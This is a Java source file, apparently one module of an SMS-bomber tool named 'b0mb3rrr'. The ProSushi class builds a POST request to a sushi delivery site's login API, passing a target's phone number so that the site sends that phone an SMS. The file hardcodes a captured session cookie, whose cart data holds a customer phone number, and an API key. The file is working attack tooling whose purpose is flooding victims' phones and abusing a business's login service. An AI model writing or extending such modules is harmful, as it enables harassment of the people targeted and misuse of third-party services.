package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.FormBody;
import okhttp3.Request;

public class ProSushi extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        return new Request.Builder()
                .url("https://newkrd.prosushi.ru/api/profile2/login")
                .post(new FormBody.Builder()
                        .add("phone", phone.format("+*(***)***-**-**"))
                        .add("key", "c7ac95c2fe87e5640a4546e410eba17b")
                        .add("url", "/")
                        .build())
                .header("Accept", "*/*")
                .header("Accept-Language", "en-US,en;q=0.9,ru;q=0.8")
                .header("Connection", "keep-alive")
                .header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("Cookie", "session_21=mdq6d3bfqeq4bb7t00tleejpr1; messages_21=%5B%5D; _ym_uid=1712658512982765125; _ym_d=1712658512; roistat_visit=4123970; roistat_first_visit=4123970; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; _ym_isad=2; roistat_phone=%2B7%20(861)%20202-97-19; roistat_raw_phone=78612029719; roistat_call_tracking=1; roistat_phone_replacement=null; roistat_phone_script_data=%5B%7B%22phone%22%3A%22%2B7%20(861)%20202-97-19%22%2C%22css_selectors%22%3A%5B%22.roistat-phone%22%5D%2C%22replaceable_numbers%22%3A%5B%2278612772777%22%2C%2288612772777%22%2C%2288612034737%22%2C%2278612034737%22%2C%2288007755599%22%2C%2278007755599%22%5D%2C%22raw_phone%22%3A%2278612029719%22%7D%5D; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_phone%2Croistat_raw_phone%2Croistat_call_tracking%2Croistat_phone_replacement%2Croistat_phone_script_data; ___dc=84386797-e16a-4b2f-8470-8fbb85967acc; cart_21=%7B%22products%22%3A%5B%5D%2C%22construct%22%3A%5B%5D%2C%22gift_product%22%3Anull%2C%22construct_in_cart%22%3Afalse%2C%22customer_id%22%3A0%2C%22order_delivery%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%22%2C%22order_datetime%22%3A%22%22%2C%22address%22%3Anull%2C%22restaurant_id%22%3A11%2C%22zone_id%22%3A0%2C%22zone_min_sum%22%3A0%2C%22order_pay%22%3A%22%D0%9D%D0%B0%D0%BB%D0%B8%D1%87%D0%BD%D1%8B%D0%BC%D0%B8%20%D0%BA%D1%83%D1%80%D1%8C%D0%B5%D1%80%D1%83%22%2C%22order_cash_change%22%3A%22%D0%91%D0%B5%D0%B7%20%D1%81%D0%B4%D0%B0%D1%87%D0%B8%22%2C%22order_contact_phone%22%3A%2279501456564%22%2C%22order_comment%22%3A%22%22%2C%22is_auto%22%3Atrue%2C%22phone%22%3A%2279501456564%22%2C%22promocode%22%3A%22%22%2C%22sale_group_use%22%3A%22%D0%9D%D0%B5%20%D1%83%D0%BA%D0%B0%D0%B7%D0%B0%D0%BD%D0%BE%22%2C%22sale_use%22%3A%22%D0%9D%D0%B5%20%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D1%8C%22%2C%22sale_bonuses_use%22%3A%22%D0%A1%D0%BF%D0%B8%D1%81%D0%B0%D1%82%D1%8C%20%D0%B4%D0%BE%20%D0%BF%D0%BE%D0%B4%D0%B0%D1%80%D0%BA%D0%B0%22%2C%22sale_discount_use%22%3A%22%22%2C%22order_active_id%22%3A0%7D")
                .header("Origin", "https://newkrd.prosushi.ru")
                .header("Referer", "https://newkrd.prosushi.ru/")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "same-origin");
    }

    @Override
    public String getServiceName() {
        return "ProSushi";
    }
}
